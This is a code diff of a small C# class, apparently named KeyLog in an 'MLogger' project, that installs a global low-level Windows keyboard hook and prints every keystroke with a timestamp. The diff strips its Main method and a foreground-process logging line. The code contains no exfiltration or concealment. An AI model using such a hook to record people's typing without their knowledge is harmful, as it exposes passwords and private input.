@@ -1,24 +1,23 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
-using System.Windows.Forms;
+using System.Linq;
 using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace MLogger
 {
-    class Program
+    class KeyLog
     {
+
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
         private static Process procc;
 
-        public static void Main()
-        {
-            _hookID = SetHook(_proc);
-            Application.Run();
-            UnhookWindowsHookEx(_hookID);
-        }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
@@ -41,12 +40,9 @@ namespace MLogger
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 Console.WriteLine((Keys)vkCode + " " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt"));
-                Console.WriteLine(ProcessLog.GetForegroundProcessName());
             }
-
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
-
 
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
@@ -61,6 +57,7 @@ namespace MLogger
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
+
 
 
     }
